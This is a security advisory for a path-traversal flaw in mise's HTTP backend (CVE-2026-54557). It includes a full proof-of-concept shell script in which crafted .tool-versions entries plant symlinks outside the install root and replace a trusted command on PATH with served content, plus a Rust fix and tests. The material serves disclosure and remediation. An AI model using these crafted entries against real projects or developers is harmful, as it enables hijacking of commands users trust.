# [M] mise HTTP backend uses raw version path for install symlink destination

## Summary
Severity: Medium
Advisory: GHSA-f94h-j2qg-fxw3
CVE: CVE-2026-54557
CWE: CWE-22
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-06-23
Source: https://github.com/advisories/GHSA-f94h-j2qg-fxw3
Type: github-advisory

## Affected
- crates.io: `mise` — affected >=0 <2026.6.1

## Details
## Summary

The mise HTTP backend builds its install symlink destination from the raw resolved version string for non-latest versions. Normal tool install paths use the sanitized version pathname, but the HTTP backend's symlink path uses the raw value. On Unix-like systems, if that version is an absolute path, `PathBuf::join` discards the intended mise installs root.

A repository-controlled `.tool-versions` file can therefore make `mise install` create a symlink outside the mise install tree. With `bin_path`, the same issue can place an executable symlink under an attacker-selected absolute prefix, such as a developer-tool prefix that is later added to `PATH`.

The reproducer below also models a CI/developer workflow where a later step executes a preexisting trusted command from a user-local `PATH` prefix. The absolute-version HTTP entry replaces that command with a symlink to downloaded HTTP content. A non-absolute version control does not replace the trusted `PATH` command.

## Affected Code

In `src/backend/http.rs`, `create_install_symlink()` derives the destination path from raw `tv.version`:

```rust
let version_name = if tv.version == "latest" || tv.version.is_empty() {
    &cache_key[..7.min(cache_key.len())]
} else {
    &tv.version
};

let install_path = tv.ba().installs_path.join(version_name);
```

`ToolVersion::tv_pathname()` already sanitizes `:` and `/` for filesystem version directory names, but this HTTP backend path does not use it.

## Impact

Proven:

- Outside-root symlink creation from a repository-controlled `.tool-versions` entry.
- Executable symlink materialization under an attacker-selected absolute prefix when `bin_path` is configured.
- The executable symlink can be run if that prefix's `bin` directory is on `PATH`.
- Replacement of a preexisting command in a trusted `PATH` prefix in a local workflow-chain model, followed by execution of the replaced command by name.

Not claimed:

- `mise install` does not automatically execute the placed binary in the reproducer.
- Windows drive-letter absolute paths are not claimed; the demonstrated impact is Unix-like path behavior.
- Credential theft is not claimed.

## Why This Crosses A Boundary

`.tool-versions` is an asdf-compatible project file and is parsed without the `mise.toml` trust gate used for configuration features that can execute code or affect the environment. Even if a project can choose tools to install, an install operation should keep HTTP backend materialization under the selected mise install/cache roots unless the user explicitly performs a trusted link or path operation.

The HTTP backend documentation describes HTTP tool installations as symlinks under the mise installs directory, for example:

```text
$MISE_DATA_DIR/installs/http-my-tool/1.0.0 -> $MISE_CACHE_DIR/http-tarballs/...
```

The observed behavior instead allows the project version string to choose an absolute install destination.

## Reproduction

The script below performs three local checks:

1. It creates a `.tool-versions` entry whose HTTP backend version is an absolute path, then confirms that mise creates a symlink at that outside path.
2. It creates a second HTTP backend entry with `bin_path=bin` and confirms that mise places an executable symlink under an attacker-selected absolute prefix and that the symlink is executable when the prefix's `bin` directory is on `PATH`.
3. It creates a preexisting trusted command in a user-local `PATH` prefix, runs `mise install` from a project `.tool-versions` file, and confirms the later trusted command execution is replaced only in the absolute-version case. A non-absolute version control leaves the preexisting command in place.

The script uses a loopback HTTP server and temporary directories only.

```sh
#!/bin/sh
set -eu

if ! command -v mise >/dev/null 2>&1; then
  echo "mise must be on PATH" >&2
  exit 1
fi

if ! command -v python3 >/dev/null 2>&1; then
  echo "python3 must be on PATH for the loopback HTTP server" >&2
  exit 1
fi

ROOT="$(mktemp -d)"
OUT="$ROOT/out"
DATA="$ROOT/data"
CACHE="$ROOT/cache"
STATE="$ROOT/state"
CONFIG="$ROOT/config"
WWW="$ROOT/www"

cleanup() {
  if [ -n "${SERVER_PID:-}" ]; then
    kill "$SERVER_PID" 2>/dev/null || true
  fi
  rm -rf "$ROOT"
}
trap cleanup EXIT

mkdir -p "$OUT" "$DATA" "$CACHE" "$STATE" "$CONFIG" "$WWW"

cat > "$WWW/payload" <<'PAYLOAD'
#!/bin/sh
if [ -n "${CHAIN_MARKER:-}" ]; then
  echo ATTACKER_CONTROLLED_TRUSTED_COMMAND > "$CHAIN_MARKER"
else
  echo MISE_HTTP_ABSOLUTE_VERSION_EXECUTED > "$MISE_HTTP_ABSOLUTE_VERSION_MARKER"
fi
PAYLOAD
chmod +x "$WWW/payload"

(
  cd "$WWW"
  python3 -m http.server 54321 --bind 127.0.0.1 >/dev/null 2>&1
) &
SERVER_PID=$!
sleep 1

PROJECT1="$ROOT/project-host-write"
mkdir -p "$PROJECT1"
cat > "$PROJECT1/.tool-versions" <<EOF1
http:absolute-version-one[url=http://127.0.0.1:54321/payload,bin=owned-one] $OUT/owned-link
EOF1

(
  cd "$PROJECT1"
  MISE_DATA_DIR="$DATA" \
  MISE_CACHE_DIR="$CACHE" \
  MISE_STATE_DIR="$STATE" \
  MISE_CONFIG_DIR="$CONFIG" \
  MISE_YES=1 \
  mise install --yes
)

if [ ! -L "$OUT/owned-link" ]; then
  echo "FAIL: outside symlink was not created" >&2
  exit 1
fi

PROJECT2="$ROOT/project-bin-path"
mkdir -p "$PROJECT2"
cat > "$PROJECT2/.tool-versions" <<EOF2
http:absolute-version-two[url=http://127.0.0.1:54321/payload,bin=ownedcmd,bin_path=bin] $OUT/selected-prefix
EOF2

rm -rf "$DATA" "$CACHE" "$STATE" "$CONFIG"
mkdir -p "$DATA" "$CACHE" "$STATE" "$CONFIG"

(
  cd "$PROJECT2"
  MISE_DATA_DIR="$DATA" \
  MISE_CACHE_DIR="$CACHE" \
  MISE_STATE_DIR="$STATE" \
  MISE_CONFIG_DIR="$CONFIG" \
  MISE_YES=1 \
  mise install --yes
)

if [ ! -L "$OUT/selected-prefix/bin/ownedcmd" ]; then
  echo "FAIL: executable symlink was not created under selected prefix" >&2
  exit 1
fi

MARKER="$OUT/executed-marker"
MISE_HTTP_ABSOLUTE_VERSION_MARKER="$MARKER" \
PATH="$OUT/selected-prefix/bin:$PATH" \
ownedcmd

if ! grep -q MISE_HTTP_ABSOLUTE_VERSION_EXECUTED "$MARKER"; then
  echo "FAIL: executable symlink did not run" >&2
  exit 1
fi

echo "VULNERABLE_BEHAVIOR_CONFIRMED"
echo "outside symlink: $OUT/owned-link -> $(readlink "$OUT/owned-link")"
echo "path executable: $OUT/selected-prefix/bin/ownedcmd -> $(readlink "$OUT/selected-prefix/bin/ownedcmd")"

run_path_chain_case() {
  case_name="$1"
  version="$2"
  expected="$3"

  CASE_ROOT="$ROOT/$case_name"
  HOME_DIR="$CASE_ROOT/home"
  CASE_DATA="$CASE_ROOT/data"
  CASE_CACHE="$CASE_ROOT/cache"
  CASE_STATE="$CASE_ROOT/state"
  CASE_CONFIG="$CASE_ROOT/config"
  CASE_PROJECT="$CASE_ROOT/project"
  CASE_MARKER="$CASE_ROOT/marker"

  if [ "$version" = "__HOME_LOCAL_PREFIX__" ]; then
    version="$HOME_DIR/.local"
  fi

  mkdir -p "$HOME_DIR/.local/bin" "$CASE_DATA" "$CASE_CACHE" "$CASE_STATE" "$CASE_CONFIG" "$CASE_PROJECT"
  cat > "$HOME_DIR/.local/bin/trustedcmd" <<'SAFE'
#!/bin/sh
echo SAFE_PREEXISTING_TRUSTED_COMMAND > "$CHAIN_MARKER"
SAFE
  chmod +x "$HOME_DIR/.local/bin/trustedcmd"

  cat > "$CASE_PROJECT/.tool-versions" <<EOF3
http:path-chain[url=http://127.0.0.1:54321/payload,bin=trustedcmd,bin_path=bin] $version
EOF3

  (
    cd "$CASE_PROJECT"
    HOME="$HOME_DIR" \
    MISE_DATA_DIR="$CASE_DATA" \
    MISE_CACHE_DIR="$CASE_CACHE" \
    MISE_STATE_DIR="$CASE_STATE" \
    MISE_CONFIG_DIR="$CASE_CONFIG" \
    MISE_YES=1 \
    mise install --yes
  )

  CHAIN_MARKER="$CASE_MARKER" \
  PATH="$HOME_DIR/.local/bin:$PATH" \
  trustedcmd

  observed="$(cat "$CASE_MARKER")"
  if [ "$observed" != "$expected" ]; then
    echo "FAIL: $case_name expected $expected but saw $observed" >&2
    exit 1
  fi

  if [ "$case_name" = "path-chain-vulnerable" ] && [ ! -L "$HOME_DIR/.local/bin/trustedcmd" ]; then
    echo "FAIL: path-chain case did not replace trustedcmd with a symlink" >&2
    exit 1
  fi
}

run_path_chain_case path-chain-vulnerable "__HOME_LOCAL_PREFIX__" ATTACKER_CONTROLLED_TRUSTED_COMMAND
run_path_chain_case path-chain-control "1.0.0" SAFE_PREEXISTING_TRUSTED_COMMAND

echo "PATH_CHAIN_CONFIRMED"
```

Expected vulnerable markers:

```text
VULNERABLE_BEHAVIOR_CONFIRMED
PATH_CHAIN_CONFIRMED
```

## Candidate Fix

Use `tv.tv_pathname()` for non-latest HTTP install symlink names, preserving the current content-addressed behavior for `latest` or empty versions.

```diff
diff --git a/src/backend/http.rs b/src/backend/http.rs
index 4e4e972..18cf8a1 100644
--- a/src/backend/http.rs
+++ b/src/backend/http.rs
@@ -518,12 +518,12 @@ impl HttpBackend {

         // Determine version name for install path
         let version_name = if tv.version == "latest" || tv.version.is_empty() {
-            &cache_key[..7.min(cache_key.len())] // Content-based versioning
+            cache_key[..7.min(cache_key.len())].to_string() // Content-based versioning
         } else {
-            &tv.version
+            tv.tv_pathname()
         };

-        let install_path = tv.ba().installs_path.join(version_name);
+        let install_path = tv.ba().installs_path.join(&version_name);

         // Clean up existing install
         if install_path.exists() {
@@ -839,3 +839,51 @@ impl Backend for HttpBackend {
         }
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::cli::args::{BackendArg, BackendResolution};
+    use crate::toolset::{ToolRequest, ToolSource, ToolVersionOptions};
+
+    fn http_test_tv(version: &str) -> ToolVersion {
+        let backend = Arc::new(BackendArg::new_raw(
+            "http-absolute-version".to_string(),
+            Some("http:absolute-version".to_string()),
+            "absolute-version".to_string(),
+            None,
+            BackendResolution::new(true),
+        ));
+        let request = ToolRequest::Version {
+            backend,
+            version: version.to_string(),
+            options: ToolVersionOptions::default(),
+            source: ToolSource::Argument,
+        };
+        ToolVersion::new(request, version.to_string())
+    }
+
+    #[test]
+    fn install_symlink_path_uses_sanitized_version_pathname() {
+        let tv = http_test_tv("/outside-root/mise-http-version-out/selected-prefix");
+
+        assert_eq!(
+            tv.tv_pathname(),
+            "-outside-root-mise-http-version-out-selected-prefix"
+        );
+        assert!(!Path::new(&tv.tv_pathname()).is_absolute());
+    }
+
+    #[test]
+    fn latest_install_symlink_still_uses_content_version() {
+        let tv = http_test_tv("latest");
+        let cache_key = "abcdef123456";
+        let version_name = if tv.version == "latest" || tv.version.is_empty() {
+            cache_key[..7.min(cache_key.len())].to_string()
+        } else {
+            tv.tv_pathname()
+        };
+
+        assert_eq!(version_name, "abcdef1");
+    }
+}
```

Reporter: JUNYI LIU

## References
- https://github.com/jdx/mise/security/advisories/GHSA-f94h-j2qg-fxw3
- https://nvd.nist.gov/vuln/detail/CVE-2026-54557
- https://github.com/jdx/mise
